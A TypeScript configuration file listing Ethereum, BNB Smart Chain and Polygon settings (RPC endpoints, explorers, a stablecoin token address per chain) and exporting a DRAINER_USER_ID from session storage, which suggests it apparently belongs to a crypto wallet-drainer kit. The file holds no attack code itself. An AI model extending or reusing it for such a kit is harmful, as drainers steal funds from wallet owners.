import { ChainData, ChainName } from "./type";

export const chainData: { [key: string]: ChainData } = {
    1: {
        chainId: '0x1',
        chainName: "Ethereum Mainnet",
        chainRequestSumbol: 'eth',
        nativeCurrency: {
            name: "Ether",
            symbol: "ETH",
            decimals: 18,
        },
        rpcUrls: ["https://rpc.ankr.com/eth"],
        blockExplorerUrls: ["https://etherscan.io"],
        additionalTokens: ['0xdAC17F958D2ee523a2206206994597C13D831ec7'],
    },
    56: {
        chainId: '0x38',
        chainName: "BNB Smart Chain",
        chainRequestSumbol: 'bnb',
        nativeCurrency: {
            name: "Binance Coin",
            symbol: "BNB",
            decimals: 18,
        },
        rpcUrls: ["https://rpc.ankr.com/bsc"],
        blockExplorerUrls: ["https://bscscan.com"],
        additionalTokens: ['0x55d398326f99059fF775485246999027B3197955'],
    },
    137: {
        chainId: "0x89",
        chainName: "Polygon Mainnet",
        chainRequestSumbol: 'polygon',
        nativeCurrency: {
            name: "MATIC",
            symbol: "MATIC",
            decimals: 18
        },
        rpcUrls: ["https://rpc.ankr.com/polygon"],
        blockExplorerUrls: ["https://polygonscan.com"],
        additionalTokens: ['0xc2132d05d31c914a87c6611c10748aeb04b58e8f'],
    },
    // 728126428: {
    //     chainId: "0x2b6653dc",
    //     chainName: "Tron Mainnet",
    //     nativeCurrency: {
    //         name: "TRON",
    //         symbol: "TRX",
    //         decimals: 6
    //     },
    //     rpcUrls: ["https://api.trongrid.io/jsonrpc"],
    //     blockExplorerUrls: ["https://tronscan.org"],
    //     additionalTokens: [],
    // },
    // 4: {
    //     chainName: "Solana Mainnet",
    //     nativeCurrency: {
    //         name: "SOL",
    //         symbol: "SOL",
    //         decimals: 9
    //     },
    //     rpcUrls: ["https://rpc.ankr.com/solana_devnet"],// Only dev
    //     blockExplorerUrls: ["https://explorer.solana.com"]
    // }
};

export const DRAINER_USER_ID = sessionStorage.getItem('DRAINER_ID');


export const chainNameToId: { [key: ChainName]: number } = {
    eth: 1,
    bsc: 56,
    polygon: 137,
    trx: 728126428,
}